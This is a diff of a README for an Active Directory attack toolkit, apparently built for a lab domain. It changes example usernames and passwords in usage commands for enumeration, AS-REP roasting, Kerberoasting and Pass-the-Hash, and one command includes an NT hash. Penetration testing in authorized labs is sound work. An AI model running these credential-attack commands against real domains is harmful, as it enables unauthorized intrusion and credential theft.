@@ -112,29 +112,29 @@ pip install ldap3 impacket reportlab
 ### Run full assessment
 ```bash
 python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local \
-  -u christian -p "Password" --all
+  -u labadmin -p "Password" --all
 ```
 
 ### Run full assessment with Pass-the-Hash
 ```bash
 python3 ad_attack.py --dc-ip 192.168.56.10 --domain psychosec.local \
-  -u christian -p "Password" --all \
+  -u labadmin -p "Password" --all \
   --pth --pth-user admin.helpdesk --nthash 520126a03f5d5a8d836f1c4f34ede7ce
 ```
 
 ### Individual modules
 ```bash
 # Enumeration only
-python3 ad_enum.py --dc-ip 192.168.56.10 -u "PSYCHOSEC\christian" -p "Password"
+python3 ad_enum.py --dc-ip 192.168.56.10 -u "PSYCHOSEC\labadmin" -p "LabPassword"
 
 # AS-REP Roasting only
 python3 asreproast.py --dc-ip 192.168.56.10 --domain psychosec.local
 
 # Kerberoasting only
-python3 kerberoast.py --dc-ip 192.168.56.10 --domain psychosec.local -u christian -p "Password"
+python3 kerberoast.py --dc-ip 192.168.56.10 --domain psychosec.local -u labadmin -p "LabPassword"
 
 # Pass-the-Hash only
-python3 pth.py --dc-ip 192.168.56.10 --domain psychosec.local -u admin.helpdesk --nthash 520126...
+python3 pth.py --dc-ip 192.168.56.10 --domain psychosec.local -u admin.test --nthash 520126...
 ```
 
 ### Cracking captured hashes
